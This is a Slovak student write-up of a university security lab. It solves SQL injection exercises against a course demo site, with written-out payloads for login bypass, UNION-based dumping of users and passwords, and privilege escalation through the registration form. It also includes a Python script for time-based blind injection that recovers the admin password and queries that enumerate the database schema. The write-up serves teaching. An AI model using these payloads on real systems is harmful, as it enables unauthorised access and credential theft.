# Cvicenie 1 BIT

### Fedor Viest

## 1.1 Hranie sa so SELECT-om

- Pomocou SQL injekcií v prihlasovacom formulári získajte “tajné heslo” k torpédam.
- Nájdite v tabuľke používateľa, ktorého login začína na písmeno “k”.
- Je jediný, ktorého meno začína na “k”?
- Koľko používateľov je v tabuľke users?

Najprv som skúsil zadať náhodné prihlasovacie údaje a stránka vypisala **invalid login**. Nasledne som zadal znak ```'```, aby som zistil, ci je formular zranitelny na sql injection. Toto mi na stranke vzhodilo error code, cize formular je zranitelny na sql injection. 

1. 
    Z moznosti zadavania udajov, som usudil, ze query do db vyzera nejak takto:
    ```sql
    select * from users where username like '' and password like ''
    ```

    Tak som skusil zadat do policka login
    ```sql
    admin' -- 
    ```

    toto zapricini, ze query bude vyzerat takto, pridanie komentara na koniec znamena, ze zvysok query nebude vykonany:
    ```sql
    select * from users where username like 'admin' -- and password like ''
    ```
    ![](1.1.png)
        
2. Najprv som skusal nasledujuce vstupy, ktore mi vzdy vyhodili error:

    ```sql
    admin' select * from users where username like "k%" -- 
    admin' and 1=1; select * from users where "="
    admin' select * from users # where name like 'k%
    ```

    problem bol v tom, ze tieto vstupy by vratili viac ako jeden vysledok a v query bolo urcene LIMIT 1.

    Dalej som skusil sql injection pomocou union select. Postupne som zistoval kolko je v query stlpcov.
    ```sql
    ' union select null from users where login like 'k%' -- 
    ```
    , pricom vzdy ked som dostal error tak som pridal **null,** navyse. Ked som ziskal spravny pocet riadkov nahradil som **null** cislami, aby som zistil poradove cislo parametra, ktore query vracia. Pomocou tohto vstupu som zistil, ze sa vypise parameter na 2. pozicii.

    ```sql
    ' union select 1, 2, 3, 4 from users where login like 'k%'--
    ```

    ```sql
    ' union select password, login, null, null from users where login like 'k%'-- 
    ```
    ![](1.1_kabar.png)

    takto vyezeral vysledok, pricom pouzivatel je **kabar**.
    Pomocou tejto query upravenej o OFFSET som si vedel preiterovat vsetkych pouzivatelov v databaze.

    ```sql
    ' union select password, login, null, null from users where login like 'k%' limit 1 offset 2#
    ```

    Pouzivatelia v databaze:
    - upratovacka
    - jozko
    - admin
    - kabar
    - kohutik

## 1.2 Registračný formulár
- Podstránka s registráciou obsahuje tiež SQL injection zraniteľnosť.
- Vytvorte si pomocou nej používateľa s vyššími privilégiami.

Pred vykonanim tejto ulohy som spravil ulohu 1.4, aby som ziskal prehlad o strukture databazy.

Pri vkladani do databazy som predopkladal, ze query vyzera nasledovne:
```sql
insert into users (column1, column2, column3) values (value1, value2, value3)
```

Ako prvy krok som skusil prikaz nizsie, pricom mi vyhodilo error pri registracii. 

```sql
1, 'abcd', 'password') -- 
```

Po zmeneni poradia hodnot mi registracia zbehla uspesne
```sql
abcd', 'password', 1) --
```

![](1.1_abcd.png)

Prihlasenie za pouzivatela abcd


## 1.3 Blind injection
- Poznajúc štruktúru users tabulky (login, password, ...), zistite pomocou tzv. blind SQL injection zraniteľnosti heslo pre používateľa “admin”.
- Na zneužitie použite API endpoint s informáciami “o torpédach” na podstránke “torpedo.php”, kde atribút “id” môže obsahovať číslo torpéda.

Najprv uvediem neuspesne pokusy, ktore som vykonal pre hociaku roznu odozvu stranky.

```
https://xviest.bit.demo-cert.sk/torpedo.php?id=3'
https://xviest.bit.demo-cert.sk/torpedo.php?id=3 -- 
https://xviest.bit.demo-cert.sk/torpedo.php?id=3 sleep(3) --
```

Postupne som sa dopatral k prikazu:

```
https://xviest.bit.demo-cert.sk/torpedo.php?id=3 and 1=2 union select sleep(5)
```

Tento prikaz uspal databazu na 5 sekund, cim som docielil pristup k databaze. Tento prikaz funguje tak, ze prva cast (id=3 and 1=2) je vzdy false a tym padom vrati 0 vysledkov. Ked to skombinujem pomocou **UNION** s query **select sleep(5)**, ktora rovnako vracia 0 riadkov, databaza sa uspi na 5 sekund.

V dalsom kroku som nadviazal na tento prikaz a pridal som if statement:
```sql
https://xviest.bit.demo-cert.sk/torpedo.php?id=1 and 1=2 union select if(password like "5%", sleep(5), false) from users where login like "admin"--
```

V if statement kontrolujem ci sa heslo pre pouzivatela admin zacina na znak 5. (Viem, ze sa zacina na znak 5, lebo heslo som si vedel zistit z ulohy 1.1). Kedze uz viem ako tato url funguje, vedel som si spravit python script, ktory postupne iteruje po vsetkych cislach a kontroluje, ci je response dlhsi ako 2 sekundy. V pripade, ze je, vie, ze trafil spravny znak v hesle a tento znak si zapamata.

```python
import requests as requests
import time

password = ""
iterator = 0

try:
    for i in range(8):
        iterator = 0
        for id_number in range(0, 10):
            url = "https://xviest.bit.demo-cert.sk/torpedo.php?id=1 and 1=2 " \
                "union select if(password like \"{}{}%\" and login like 'admin', sleep(5), false) " \
                  "from users where login like \"admin\" --".format(password, id_number)
            start = time.time()
            response = requests.get(url)
            end = time.time()
            if end - start > 2:
                iterator = 1
                password += str(id_number)
                print("Found: {}".format(id_number))
                break
        if iterator == 0:
            print("Password found: {}".format(password))
            break
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
```

![](1.3.png)

Heslo pre admina je 5957

## 1.4 Identifikácia štruktúry databázy
- Odhaľte pomocou zraniteľnosti identifikovanej v bode 1.1 štruktúru vašej DB
- Nájdite tajnú tabuľku, ktorej názov je iný ako users alebo torpedos a získajte jej obsah.

Po tabulkach som vedel iterovat pomocou funkcie **OFFSET** rovnako ako v ulohe 1.1. 

Najprv som si zistil verziu DB: 8.0.34-0ubuntu0.20.04.1

```sql
' UNION SELECT 1, @@version, 3, 4#
```

Pomocou offset som presiel vsetky schemy a nasiel schemu s mojim menom (xviest). Nasledne som si vyfiltroval vsetky tabulky, ktore patria pod moje meno a znova som vsetky preiteroval

```sql
' UNION SELECT 1, table_schema, 3, 4 from information_schema.tables limit 1 offset 2#

' UNION SELECT 1, table_name, 3, 4 from information_schema.tables where table_schema like 'xviest' limit 1 offset 2#
```

**Zoznam tabuliek: torpedos, users, topsecret**

Rovnakym sposobom som vedel prejst aj columns pre kazdu jednu tabulku:

```sql
' UNION SELECT 1, column_name, 3, 4 from information_schema.columns where table_name like 'torpedos' limit 1 offset 0 #

' UNION SELECT 1, column_name, 3, 4 from information_schema.columns where table_name like 'users' limit 1 offset 0 #

' UNION SELECT 1, column_name, 3, 4 from information_schema.columns where table_name like 'topsecret' limit 1 offset 0 #
```

Pricom columns pre tabulky boli
- torpedos: id, status
- users: can_fire, login, password
- topsecret: keyz

Obsah tabulky topsecret som zistil nasledovne:

```sql
' UNION SELECT 1, GROUP_CONCAT(keyz SEPARATOR ''), 3, 4 from topsecret#
```

tato query mi zluci vsetky vysledky z keyz do jedneho stringu

**Obsah tabulky:**

congratz. this is the end of first week....(go outside, nothing funny here)(seriously)

![](1.4.png)




